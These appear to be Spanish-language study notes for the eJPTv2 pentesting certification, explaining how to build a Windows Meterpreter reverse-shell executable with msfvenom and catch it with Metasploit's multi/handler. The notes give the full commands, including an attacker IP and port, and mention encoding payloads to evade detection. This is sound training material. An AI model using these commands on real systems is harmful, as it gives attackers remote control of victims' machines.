Es una herramienta del Metasploit Framework usada para generar **payloads** personalizables. Sirve para crear archivos maliciosos que pueden ejecutarse en una máquina víctima, iniciando una conexión hacia el atacante (reverse shell, bind shell, etc.).

Se usa principalmente para:

- Crear ejecutables con payloads incluidos.
- Generar scripts para inyección (en Python, Bash, etc.).
- Codificar payloads para evadir detección

````
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.138 LPORT=443 -f exe -o pwned.exe
`````

- `-p windows/x64/meterpreter/reverse_tcp`: Payload tipo reverse shell con Meterpreter para Windows 64 bits
- `LHOST=192.168.1.138`: IP de tu máquina atacante (donde esperas la conexión de la víctima).
- `LPORT=443`: Puerto en tu máquina atacante que estará escuchando.
- `-f exe`: Formato de salida: archivo ejecutable `.exe`.
- `-o pwned.exe`: Nombre del archivo generado con el payload incrustado.

![[1.1. MSFVENOM.jpg]]

Una vez hayamos creado nuestro archivo tendremos que pasarlo a la máquina victima mediante lo explicado en los siguientes apartados:

- [[eJPTv2/CONCEPTOS BÁSICOS/2. Compartir archivos con servidor http]]
- [[eJPTv2/CONCEPTOS BÁSICOS/3. Compartir archivos en máquinas Windows (Sin curl ni wget)]]

Para activar la escucha de este archivo que hemos creado tendremos la opción de [[eJPTv2/CONCEPTOS BÁSICOS/1. Netcat]] o podremos hacer uso de un apartado de Metasploit de la siguiente forma.

Tendremos que entrar dentro de la consola de MSF y realizar una búsqueda de un apartado llamado "multi/handler".

![[1.2. MSFVENOM.jpg]]

Una vez encontrado lo seleccionaremos mediante "use" y veremos que nos pide únicamente LHOST Y LPORT. También podemos ver que tiene un payload genérico seleccionado. 

Primeramente, vamos a poner los datos de LHOST y LPORT de la siguiente forma 
 
````
set LHOST 192.168.1.138
set LPORT 443
`````
(En este caso son estos valores pero podrían variar según los que tengamos en cada momento.)

Una vez establecido los parámetros básicos tendremos que seleccionar el payload que queremos. SIEMPRE será el mismo que se ha usado en el comando inicial.

![[1.4. MSFVENOM.jpg]]

Una vez tengamos todos los parámetros establecidos podremos hacer un RUN y se abrirá una sesión de meterpreter cuando se ejecute el archivo que habremos pasado en la máquina atacante.

![[1.5. MSFVENOM.jpg]]


